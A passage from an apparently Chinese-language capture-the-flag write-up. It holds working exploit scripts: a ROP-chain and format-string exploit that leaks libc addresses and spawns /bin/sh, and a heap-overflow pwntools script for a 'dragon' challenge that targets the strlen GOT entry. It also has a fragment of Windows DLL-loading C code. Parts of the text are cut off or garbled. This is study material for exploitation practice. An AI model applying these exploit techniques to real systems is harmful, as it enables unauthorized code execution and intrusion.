           printf("len=%dn", strlen((char*)str));
           HMODULE handle = LoadLibraryA("DLL_Export.dll");
           ENCRYPT ProcAddr;
           ProcAddr = (ENCRYPT)GetProcAddress(handle, "Encrypt");
           printf("%xn", ProcAddr);
           unsigned char c1[]= "x21x23x25x26x2a";
           unsigned char c3[]="x43x45x47x49x4b";
           unsigned char c2[]="x35x36x37x38x39";
           unsigned char input[17];
           //for(int i0=0;i0 0:
             rop_data += l32(p_ret[len(args)] + pie_text_base)
         for arg in args:
             rop_data += l32(arg)
         return rop_data
       def pwn(io):
        puts_got                   = 0x0804a01c          
        offset_puts                = 0x656a0             
        puts_plt                   = 0x080484c0
        read_plt                   = 0x08048480
        read_buff_addr = 0x0804862B
        check_stack_fail_got = 0x804A014
        bss_addr = 0x0804a000 + 0xe20
        leave_ret = 0x08048715
        pop_ebp_ret = 0x0804871f #: pop ebp ; ret
        username = ""
        #username += 'bbbb'
        username += l32(check_stack_fail_got)
        username += "a"*0x4C
        #username += "bbbb"
        username += gen_rop_data(puts_plt, [puts_got])
        username += gen_rop_data(read_buff_addr, [bss_addr, 0x01010101])
        username += l32(pop_ebp_ret) + l32(bss_addr)
        username += l32(leave_ret)
        #username += gen_rop_data(puts_plt, [puts_got+4])
        print hex(len(username)), hex(0xd6 - 0x5c - 4)
        #username = username.ljust(0xd6 - 0x5c - 4, 'a')
        #username += "%s:%s.%p.%p.%p.%p.%p"# + "%p."*4
        #username += "%x.".ljust(8, '-')*10
        #username += "aa:"
        username = username.ljust(0xc0, 'a')
        username += 'a'*(0x66-0x43)
        username += "%9$hhn.".ljust(10, '-')
        #username += "%9$p.".ljust(10, '-')
        username = username.ljust(0x100-1, 'a')
        password = ""
        password += 'w' * 0x40
        io.read_until(":")
        io.writeline(username)
        io.read_until(":")
        #io.gdb_hint()
        io.writeline(password)
        io.read_until("")
        io.read_until("Login successful!n")
        io.read_until("n")
        data = io.read_until("n")
        print data
        puts_addr = l32(data[:4])
        offset_system = 0x3e800
        offset_execve = 0xB59F0
        #"""
        #remote
        offset_system = 0x3fe70
        offset_puts                = 0x64da0
        offset_execve = 0xB4EA0
        #"""
        libc_base = puts_addr - offset_puts
        system_addr = libc_base + offset_system
        execve_addr = libc_base + offset_execve
        payload = ""
        payload += l32(0x0)
        payload += gen_rop_data(execve_addr, [bss_addr+0x100, 0, 0])
        payload = payload.ljust(0x100, 'a')
        payload += "/bin/shx00"
        payload += l8(0x1f)
        io.gdb_hint()
        io.writeline(payload)
        io.interact()
     io = get_io(target)
     pwn(io)
**Pwn-Dragon**
存在堆溢出，可以修改堆结构中的size.
脚本如下：
    from pwn import *
       #r = remote('58.213.63.30', 11501) 
       r = process("./dragon")
       def add(size, name, content):
         r.recvuntil('>>')
         r.sendline('1')
         r.recvuntil(':')
         r.sendline(str(size))
         r.recvuntil(':')
         r.sendline(name)
         r.recvuntil(':')
         r.sendline(content)
       def edit(id, content):
         r.recvuntil('>>')
         r.sendline('2')
         r.recvuntil(':')
         r.sendline(str(id))
         r.recvuntil(':')
         r.write(content)
       def show(id):
         r.recvuntil('>>')
         r.sendline('4')
         r.recvuntil(':')
         r.sendline(str(id))
       def delete(id):
         r.recvuntil('>>')
         r.sendline('3')
         r.recvuntil(':')
         r.sendline(str(id))
     add(0x20, 'AAAA', 'AAAA')
     add(0x20, 'AAAA', 'A'*0x18)
     add(0x20, 'AAAA', 'A'*0x18)
     edit(0, 'A'*0x18+p64(0xd1)) # note1
       delete(1)
     add(0x20, 'AAAA', 'A'*0x18)
     strlen_got = 0x602028
       add(0x10, 'AAAA', p64(strlen_got)+'d'*0x10)